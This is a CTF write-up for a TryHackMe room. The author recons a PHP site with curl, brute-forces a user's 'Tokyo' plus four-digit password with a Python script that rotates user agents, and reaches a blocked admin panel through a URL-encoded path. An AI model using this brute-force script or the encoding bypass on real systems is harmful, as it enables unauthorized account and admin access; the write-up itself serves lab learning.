Farewell

TryHackMe CTF. A soon-to-be decommissioned server, a farewell message form, and an admin panel holding every submission.

Hmm. A PHP page that restarts all services and a proverbial greeting card on a server.

Get your curls ready for a night on the town.

The room target IP rotated between sessions and restarts. The final exploit was completed against 10.146.138.121. Earlier recon stages used the IPs active at the time.

Initial Recon

┌──(jenn㉿local)-[~]
└─$ curl -I <TARGET_IP>

Would you look at that. A session cookie (PHPSESSID). For me? How kind.

I then tried to send Mozilla/5.0 as a user agent and left off the -A. curl treated it as a separate host, threw a resolution warning, and still fetched the target:

Here's the proper curl syntax:

┌──(jenn㉿local)-[~]
└─$ curl -I -A "Mozilla/5.0" http://<TARGET_IP>

This is the second challenge in a course of firewall vulnerability assessments. I kept the newly issued PHPSESSID while I dug further into the site.

What we know so far:

  • The server returned 200 OK to the first curl -I. No new firewall rules established yet.
  • The server issued a PHPSESSID. At this point, it's our own session cookie.
  • A PHP loginForm exists on the target.
  • The server will be decommissioned in 24 hours.
  • Goodbye messages to the server can be seen on the homepage.
  • An admin and/or message bot is highly likely.
  • check.js exists.
  • adam, deliver, and nora exist, and have co-dependency issues with a server.

Must have been one great server. Or it is sick of its end users waxing poetic when they should be maximizing efficiency. Who knows. Let's find out more.

Alright. Let’s bust this dinoserver open.

Here's the in-browser view of the homepage, in-browser. Look at the cute little bye bye server messages scrolling across the banner.

I used deliver11 as the handle because it is the only username-like handle on the farewell messages:

That is a valid username. Thanks, old server.

We'll just go ahead and grab that PHPSESSID, please and thank you.

Well would you look at that. Burp caught a response with a password hint.

Good guess on the user, Jenn. To be fair, the other two users likely have similar plaintext hints, but deliver11 is very crackable.

“Capital of Japan followed by 4 digits” is the password hint. If I had to guess, 1868 = year Tokyo was formally designated the imperial capital.

For our later climb to admin, Burp shows the login POST going to /auth.php. Its response is labeled JSON.

Let's whip up a script to brute force the four digits. Make sure you use the current target IP and point it to /auth.php:

nano tokyo_crypt.py
import requests
import random

USERNAME = 'deliver11'
TARGET = 'http://<TARGET_IP>/auth.php'

USER_AGENTS = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
]

# Session reuse keeps the TCP/TLS connection alive across requests
session = requests.Session()

for x in range(1000, 10000):
    url = f'{TARGET}?i={x}'
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': random.choice(USER_AGENTS),
    }
    data = f'username={USERNAME}&password=Tokyo{x}'

    try:
        resp = session.post(url, headers=headers, data=data, timeout=5)
    except requests.RequestException as e:
        print(f'[ERROR] Tokyo{x}: {e}')
        continue

    if 'auth_failed' in resp.text:
        print(f'[FAILED] Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(resp.content)}')
    else:
        print(f'[SUCCESS] Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(resp.content)}')
        break

Run it:

┌──(jenn㉿local)-[~]
└─$ python3 tokyo_crypt.py

Thank you, deliver11. You may want to change your password (wink).

Flag 1 = nabbed.

Ugh. I heard aloud in my head while I typed it. It was an innocent remark. I am not hitting backspace.

fetch_status=1 returned {"status":200}. The status check worked, but the response alone does not tell us what URL the server checked.

Now I'll send a restart request:

┌──(jenn㉿local)-[~]
└─$ curl -i -X POST \
-b 'PHPSESSID=uh0q23tnqrjc2sb7ucsu6re15j' \
-d 'restart=1' \
http://<TARGET_IP>/status.php

Aha. The response shows the page's status refresh script.

Direct access to /admin.php still gets blocked. I want to see If the filter treats an encoded path differently.

Time to encode, and time for Full Metal Jenn.

Full Metal Jenn doesn't mess around. She goes straight to encoding the admin path:

┌──(jenn㉿local)-[~]
└─$ curl -i -b 'PHPSESSID=uh0q23tnqrjc2sb7ucsu6re15j' \
'http://<TARGET_IP>/%61dmin.php'

I kid you not: I did not try any approaches that I'm keeping out of my notes to look better.

The encoded /%61dmin.php path got us into the admin panel. Full Metal Jenn FTW!
